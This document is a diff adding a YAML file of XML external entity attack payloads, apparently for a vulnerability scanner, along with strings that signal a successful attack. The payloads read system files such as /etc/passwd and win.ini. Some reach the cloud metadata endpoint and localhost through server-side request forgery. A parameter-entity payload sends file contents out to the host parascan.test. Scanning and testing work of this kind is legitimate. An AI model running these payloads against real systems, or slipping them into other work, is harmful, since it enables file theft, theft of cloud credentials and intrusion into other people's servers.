@@ -1,0 +1,55 @@
+# XXE payloads
+
+basic:
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <root>&xxe;</root>
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///etc/hosts">
+    ]>
+    <root>&xxe;</root>
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+    ]>
+    <root>&xxe;</root>
+
+ssrf_via_xxe:
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+    ]>
+    <root>&xxe;</root>
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://127.0.0.1:22">
+    ]>
+    <root>&xxe;</root>
+
+parameter_entity:
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+      <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://parascan.test/?x=%xxe;'>">
+      %eval;
+      %exfil;
+    ]>
+    <root>test</root>
+
+# signatures indicating XXE success
+success_signatures:
+  - "root:"
+  - "daemon:"
+  - "/bin/bash"
+  - "[extensions]"
+  - "ami-"
+  - "meta-data"
